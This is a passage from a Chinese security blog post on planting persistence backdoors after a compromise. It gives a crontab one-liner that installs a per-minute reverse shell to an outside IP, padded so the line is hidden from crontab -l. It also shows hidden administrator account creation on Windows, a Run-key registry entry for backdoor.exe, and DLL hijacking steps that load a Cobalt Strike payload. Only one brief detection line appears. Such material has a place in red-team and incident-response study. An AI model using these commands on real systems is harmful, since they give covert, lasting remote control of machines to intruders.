<h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><p>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#每分钟执行一次</span></span><br><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">&quot;*/1 * * * * /bin/bash -c &#x27;/bin/sh -i &gt;&amp; /dev/tcp/192.168.86.134/6666 0&gt;&amp;1&#x27;;\r%100c\n&quot;</span>)|crontab -</span><br></pre></td></tr></table></figure>
<p> 排查：<br>一般通过crontab -l命令即可检测到定时任务后门。</p>
<h3 id="win-1"><a href="#win-1" class="headerlink" title="win"></a>win</h3><h4 id="影子用户"><a href="#影子用户" class="headerlink" title="影子用户"></a>影子用户</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net user hacker$ 123456 /add</span><br><span class="line">net localgroup administrators hacker$ /add <span class="comment">#带$符号的账户在常规cmd下是无法查看到</span></span><br><span class="line"><span class="comment">#在任务管理器中找还是可以找到该用户的，为了防止被发现，可以通过修改注册表的方式进行用户的创建</span></span><br><span class="line">CreateHiddenAccount.exe -u teamssix -p Passw0rd</span><br></pre></td></tr></table></figure>
<h4 id="修改开机自启动注册表"><a href="#修改开机自启动注册表" class="headerlink" title="修改开机自启动注册表"></a>修改开机自启动注册表</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD <span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span> /v <span class="built_in">test</span> /t REG_SZ /d <span class="string">&quot;C:\Users\bmth\Desktop\backdoor.exe&quot;</span></span><br><span class="line"><span class="comment">#添加键test，值为后门程序路径</span></span><br></pre></td></tr></table></figure>
<h4 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h4><p>动态链接库 (DLL) 是一种在 Windows 操作系统中使用的文件格式，允许多个程序共享功能和资源。可以看成一个函数或者一个模块</p>
<p>使用流程：</p>
<ol>
<li>使用工具<strong>ProcessMonitor</strong>，找到要劫持的进程</li>
<li>使用工具<strong>AheadLib</strong>（管理员权限打开），输入目标dll的路径，选择直接转发函数，导出对应的CPP文件</li>
<li>用vs打开，在入口函数处添加cs生成的payload，打包生成新的dll文件</li>
<li>将原dll文件改名为之前在软件里面的名字文件放回去</li>
<li>最后运行目标程序，就会成功上线cs</li>
</ol>

        </div>

        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/server/"># server</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2024/08/02/java/%E8%87%AA%E5%8A%A8%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AE%9E%E8%B7%B5/">自动化代码审计实践</a>
            
            
            <a class="next" rel="next" href="/2024/07/10/server/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© mayylu | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>